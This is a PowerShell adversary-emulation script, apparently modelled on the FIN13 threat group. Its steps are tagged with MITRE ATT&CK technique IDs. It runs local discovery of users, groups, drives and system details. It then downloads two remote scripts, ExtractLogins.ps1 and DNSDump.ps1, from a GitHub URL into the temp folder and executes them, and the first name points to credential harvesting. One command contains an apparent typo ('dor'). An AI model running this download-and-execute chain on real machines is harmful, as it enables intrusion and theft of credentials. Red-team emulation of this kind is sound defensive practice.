<#
STEP: LOCAL RECONNAISSANCE
** Run PowerShell with Administrative Privileges **
#>

#T1033
whoami;

#T1082
systeminfo;
fsutil fsinfo drives;

#T1083, T1059, T1059.003
cmd /c dor .\\\\;

#T1083
attrib /D;

#T1033
net user;
net accounts;

#T1069.001
net localgroup;

#T1105
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/scythe-io/community-threats/master/FIN13/VFS/ExtractLogins.ps1") | Out-File "$env:TEMP\ExtractLogins.ps1";
(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/scythe-io/community-threats/master/FIN13/VFS/DNSDump.ps1") | Out-File "$env:TEMP\DNSDump.ps1";

#T1033, T1059.001
C:\Users\STUDEN~1\AppData\Local\Temp\ExtractLogins.ps1;

#T1564.013, T1018
C:\Users\STUDEN~1\AppData\Local\Temp\DNSDump.ps1;

